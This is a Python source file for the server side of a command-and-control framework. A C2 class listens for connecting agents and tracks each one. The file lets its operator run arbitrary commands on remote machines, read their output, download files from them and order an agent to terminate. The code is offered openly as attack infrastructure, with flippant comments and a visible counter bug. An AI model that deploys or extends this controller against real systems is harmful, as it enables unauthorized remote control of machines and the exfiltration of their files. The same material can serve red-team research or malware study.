import socket

from dataclasses import dataclass
from threading import Thread
from time import sleep
from typing import BinaryIO
from uuid import uuid4
from pathlib import Path

from agent.protocol import (
    ProtocolSession,
    SystemInfoFrame,
    DieRequestFrame,
    ProcessStartRequestFrame,
    ProcessStartedFrame,
    ProcessTerminatedFrame,
    ProcessPipeFrame,
    FileDownloadRequestFrame,
    FileTransferStartFrame,
    FileTransferDataFrame,
    FileTransferCompleteFrame,
    FileTransferFailFrame,
)


@dataclass
class Process:
    session: ProtocolSession
    pid: int
    command: str
    task_id: int
    output: bytearray
    alive: bool = True

    def write(self, data: bytes):
        if len(data) == 0:
            return
        self.session.send(ProcessPipeFrame(self.pid, 0, data))


class Agent:
    session: ProtocolSession
    uuid: uuid4
    os: str
    process_counter: int
    processes: dict[int, Process]
    files_downloads: dict[int, Path | BinaryIO]

    def __init__(self, uuid: uuid4, session: ProtocolSession):
        self.session = session
        self.uuid = uuid
        self.os = "Unknown"
        self.processes = {}
        self.process_counter = 0
        self.files_downloads = {}
        self.files_counter = 0

    @property
    def address(self) -> str:
        return self.session.address[0]

    def die(self):
        self.session.send(DieRequestFrame())

    def spawn_process(self, command: str):
        counter = self.process_counter
        self.process_counter += 1
        self.files_counter += 1  # Smyler's note: race condition goes brrrrr
        self.session.send(ProcessStartRequestFrame(command, counter))
        while True:
            process = filter(lambda p: p.task_id == counter, self.processes.values())
            process = list(process)
            if len(process) > 0:
                return process[0]
            sleep(0.01)

    def download_file(self, remote_path: str, local_path: Path):
        counter = self.files_counter
        self.files_counter += 1  # Smyler's note: race condition goes brrrrr
        self.files_downloads[counter] = local_path
        self.session.send(FileDownloadRequestFrame(counter, remote_path, 1024))
        while counter in self.files_downloads:
            sleep(0.1)


class C2:
    agents: dict[uuid4, Agent]
    __listen: bool
    __thread: Thread
    __socket: socket.socket
    __address: tuple[str, int]

    def __init__(self, address):
        self.agents = {}
        self.__address = address

    def listen(self):
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.__socket.settimeout(0.1)
        self.__socket.bind(self.__address)
        self.__socket.listen(5)
        print("C2 listener started")
        while self.__listen:
            try:
                sock, peer = self.__socket.accept()
            except socket.timeout:
                continue
            session = ProtocolSession(sock)

            uuid = uuid4()
            agent = SessionAgent(uuid, session)
            self.agents[uuid] = agent

            def run():
                session.run()
                print(f"Agent gone: {agent.uuid}")
                self.agents.pop(uuid)

            Thread(target=run, daemon=True).start()

    def __enter__(self):
        self.__listen = True
        self.__thread = Thread(target=self.listen)
        self.__thread.start()

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.__listen = False
        if self.__thread is not None:
            self.__thread.join()
        if self.__socket is not None:
            self.__socket.close()


def SessionAgent(uuid: uuid4, session: ProtocolSession) -> Agent:

    agent = Agent(uuid, session)

    @session.handler(SystemInfoFrame)
    def handle(frame: SystemInfoFrame, _):
        agent.os = frame.system

    @session.handler(ProcessStartedFrame)
    def handle(frame: ProcessStartedFrame, _):
        agent.processes[frame.pid] = Process(
            session,
            frame.pid,
            frame.command,
            frame.request_id,
            bytearray(),
        )

    @session.handler(ProcessTerminatedFrame)
    def handle(frame: ProcessTerminatedFrame, _):
        agent.processes[frame.pid].alive = False

    @session.handler(ProcessPipeFrame)
    def handle(frame: ProcessPipeFrame, _):
        process = agent.processes[frame.pid]
        process.output.extend(frame.data)

    @session.handler(FileTransferFailFrame)
    def handle(frame: FileTransferFailFrame, _):
        handle = agent.files_downloads.pop(frame.request_id, None)
        try:
            handle.close()
        except:
            pass

    @session.handler(FileTransferStartFrame)
    def handle(frame: FileTransferStartFrame, _):
        fname = agent.files_downloads.get(frame.request_id)
        # Who as time to write thread-safe code ???
        if not isinstance(fname, Path):
            return
        agent.files_downloads[frame.request_id] = open(fname, 'wb')

    @session.handler(FileTransferDataFrame)
    def handle(frame: FileTransferDataFrame, _):
        try:
            agent.files_downloads[frame.request_id].write(frame.data)
        except:
            pass

    @session.handler(FileTransferCompleteFrame)
    def handle(frame: FileTransferCompleteFrame, _):
        try:
            agent.files_downloads.pop(frame.request_id).close()
        except:
            pass

    return agent
